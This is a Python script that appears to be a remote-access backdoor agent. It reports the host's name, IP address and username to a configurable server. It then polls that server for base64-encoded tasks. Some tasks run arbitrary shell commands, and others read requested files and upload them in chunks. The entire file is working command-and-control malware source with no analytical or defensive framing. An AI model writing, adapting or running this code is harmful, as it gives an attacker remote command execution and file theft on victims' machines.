srv = ['']

import sys,time,base64,socket,random,getpass,subprocess
if sys.version_info.major==2:
  import urllib as parse
  import urllib2 as req
  def _x(*a,**k):
    o,e=subprocess.Popen(*a,**k).communicate()
    return e.decode(X)+o.decode(X)+' '
else:
  import urllib.parse as parse
  import urllib.request as req
  def _x(*a,**k):
    p=subprocess.run(*a,**k)
    return p.stderr.decode(X)+p.stdout.decode(X)+' '
D=10
N=50000
X='utf-8'
def _g(s,d):
  return req.urlopen(s+'?'+parse.urlencode(d)).read().decode(X)
def _p(s,d):
  return req.urlopen(req.Request(s,parse.urlencode(d).encode(X))).read().decode(X)
s_i=0
u=_g(srv[s_i],{'i':base64.b64encode('|'.join([socket.gethostname(),socket.gethostbyname(socket.gethostname()),getpass.getuser()]).encode(X)).decode(X)})
print('python = {0}'.format(str(sys.version_info.major)))
print('uuid = {0}'.format(u))
while 1:
  b=[]
  s_i=(s_i+1)%len(srv)
  print('server = {0}'.format(srv[s_i]))
  while 1:
    d=_g(srv[s_i],{'u':u})
    if d:
      break
    time.sleep(random.randint(1,D))
  while 1:
    b.append(d)
    d=_g(srv[s_i],{'u':u})
    if not d:
      break
  r=''
  try:
    if b[0][0]=='0':
      print('running command: {0}'.format(base64.b64decode(''.join(b).split('|')[1].encode(X)).decode(X)))
      r=base64.b64encode(_x(base64.b64decode(''.join(b).split('|')[1].encode(X)).decode(X),stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=1).encode(X)).decode(X)
    elif b[0][0]=='1':
      pass
    elif b[0][0]=='2':
      print('uploading file: {0}'.format(base64.b64decode(''.join(b).split('|')[1].encode(X)).decode(X)))
      f=open(base64.b64decode(''.join(b).split('|')[1].encode(X)).decode(X),'rb')
      r=base64.b64encode(f.read()).decode(X)
      f.close()
  except Exception as e:
    r=base64.b64encode(str(e).encode(X)).decode(X)
  print('number of chunks: {0}'.format(len([r[i:i+N] for i in range(0,len(r),N)])))
  for c in [r[i:i+N] for i in range(0,len(r),N)]:
    _p(srv[s_i],{'u':u,'d':c})
  _p(srv[s_i],{'u':u,'d':''})
  print('DONE')


